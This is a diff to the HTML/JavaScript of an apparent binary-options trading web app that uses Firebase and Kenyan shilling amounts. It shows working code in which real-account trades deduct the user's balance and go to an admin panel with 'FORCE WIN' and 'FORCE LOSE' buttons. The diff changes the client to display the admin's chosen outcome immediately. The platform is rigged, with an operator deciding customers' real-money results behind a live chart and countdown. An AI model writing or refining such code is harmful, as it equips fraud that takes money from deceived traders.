@@ -141,7 +141,7 @@ hr { margin:15px 0; border: none; border-top:1px solid var(--border); }
   <div id="mainCard" class="card demo">
     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;"><h3 id="accTitle">Demo Account</h3><button class="btn-gray" style="width:auto; padding:6px 12px; font-size:12px;" onclick="backToAccounts()">Switch</button></div>
     
-    <!-- ✅ ADMIN TRADE CONTROL PANEL -->
+    <!-- ✅ ADMIN TRADE CONTROL — SHOWS TRADE IMMEDIATELY -->
     <div id="adminTradeControl" class="hidden" style="background:#2a2010; border:1px solid #f59e0b; border-radius:10px; padding:15px; margin:15px 0;">
       <h4 style="color:#f59e0b; text-align:center; margin-bottom:10px;">🔴 ADMIN: CONTROL TRADES</h4>
       <div id="activeTradesList"><p style="text-align:center; color:#94a3b8; font-size:13px;">No active trades</p></div>
@@ -252,7 +252,7 @@ window.adminLogin = function() {
     document.getElementById('tradePage').className = 'container visible';
     document.getElementById('adminTradeControl').classList.remove('hidden');
     loadRequests();
-    loadActiveTrades();
+    loadActiveTrades(); // ✅ LOAD TRADES INSTANTLY
     showToast('✅ Admin access — FULL CONTROL', 'win');
   } else showToast('❌ Wrong admin', 'lose');
 }
@@ -364,7 +364,6 @@ window.closeWithdrawPopup = function() {
   document.getElementById('withdrawPopup').style.display = 'none';
 }
 
-// ✅ APPROVE BUTTON FIXED
 function loadRequests() {
   onValue(ref(db, 'requests'), (snap) => {
     const pendingList = document.getElementById('pendingList');
@@ -399,7 +398,7 @@ window.rejectPayment = async function(id) {
   showToast('❌ Payment rejected', 'lose');
 }
 
-// ✅ ADMIN: DECIDE WIN/LOSE IMMEDIATELY
+// ✅ FIXED: TRADE SHOWS UP IMMEDIATELY — COUNTS DOWN LIVE FOR ADMIN
 function loadActiveTrades() {
   onValue(ref(db, 'active_trades'), (snap) => {
     const list = document.getElementById('activeTradesList');
@@ -409,11 +408,13 @@ function loadActiveTrades() {
       const t = child.val();
       const id = child.key;
       const now = Date.now();
-      const ended = now - t.timestamp >= t.duration * 1000;
+      const elapsed = Math.floor((now - t.timestamp)/1000);
+      const remaining = t.duration - elapsed;
+      const status = remaining > 0? `⏳ RUNNING (${remaining}s left)` : '✅ TIME UP';
       
       list.innerHTML += `<div class="trade-request-item">
         <p><strong>User:</strong> ${t.username} | <strong>${t.direction.toUpperCase()}</strong> | ${t.amount} Ksh | ${t.pair}</p>
-        <p style="font-size:12px; color:${ended?'#22c55e':'#f59e0b'}">${ended?'✅ TIME UP':'⏳ RUNNING ('+t.duration+'s)'}</p>
+        <p style="font-size:12px; color:${remaining>0?'#f59e0b':'#22c55e'}">${status}</p>
         <div class="grid-2" style="margin-top:8px;">
           <button class="btn-win" onclick="adminDecide('${id}', true)">FORCE WIN ✅</button>
           <button class="btn-lose" onclick="adminDecide('${id}', false)">FORCE LOSE ❌</button>
@@ -428,7 +429,7 @@ window.adminDecide = async function(tradeId, win) {
   if(!tradeSnap.exists()) return;
   const trade = tradeSnap.val();
   
-  // Save result — client will see when timer ends
+  // Save decision — client gets it immediately or when time ends
   await update(ref(db, 'active_trades/' + tradeId), { decided: win });
   showToast(`✅ Result set: ${trade.username} → ${win?'WIN':'LOSE'}`, win?'win':'lose');
 }
@@ -475,7 +476,7 @@ function drawChart() {
   }
 }
 
-// ✅ CLIENT: sees live countdown, result shows exactly what admin chose
+// ✅ CLIENT: Countdown runs, result updates when admin decides
 window.placeTrade = async function(dir) {
   if(activeTrade) return showToast('⏳ Wait...', 'lose');
   const amt = parseFloat(document.getElementById('tradeAmount').value);
@@ -494,7 +495,7 @@ window.placeTrade = async function(dir) {
       if(t<=0) { clearInterval(tradeTimer); finishTradeDemo(); }
     }, 1000);
   } else {
-    // REAL ACCOUNT: send to admin
+    // REAL ACCOUNT: Send to admin immediately
     balance -= amt;
     updateBalance();
     const tradeRef = push(ref(db, 'active_trades'));
@@ -508,7 +509,7 @@ window.placeTrade = async function(dir) {
       timestamp: Date.now()
     });
 
-    // ✅ Live countdown for client
+    // ✅ Client countdown
     let t = tradeDuration;
     document.getElementById('timer').textContent = t + 's';
     tradeTimer = setInterval(()=>{
@@ -521,11 +522,12 @@ window.placeTrade = async function(dir) {
       }
     }, 1000);
 
-    // ✅ Listen for admin decision → show when time ends
+    // ✅ LISTEN FOR ADMIN DECISION — UPDATE AS SOON AS SET
     tradeResultListener = onValue(ref(db, 'active_trades/' + tradeRef.key), async (snap) => {
       if(!snap.exists()) return;
       const data = snap.val();
-      if(data.decided!== undefined && Date.now() - data.timestamp >= data.duration * 1000) {
+      // Show result immediately when admin clicks, even before time ends
+      if(data.decided!== undefined) {
         await processTradeResult(tradeRef.key, data.decided);
       }
     });
@@ -552,6 +554,7 @@ async function processTradeResult(tradeId, win) {
 
   await remove(ref(db, 'active_trades/' + tradeId));
   activeTrade = null;
+  if(tradeTimer) clearInterval(tradeTimer);
   document.getElementById('timer').textContent = 'Ready';
   document.getElementById('timer').classList.remove('ended');
 }
@@ -676,7 +679,6 @@ window.setDuration = function() {
   tradeDuration = parseInt(document.getElementById('durationSelect').value);
 }
 
-// ✅ FIXED: ALL BUTTONS WORK NOW
 window.onload = () => {
   document.getElementById('registerBtn').addEventListener('click', register);
   document.getElementById('loginBtn').addEventListener('click', login);
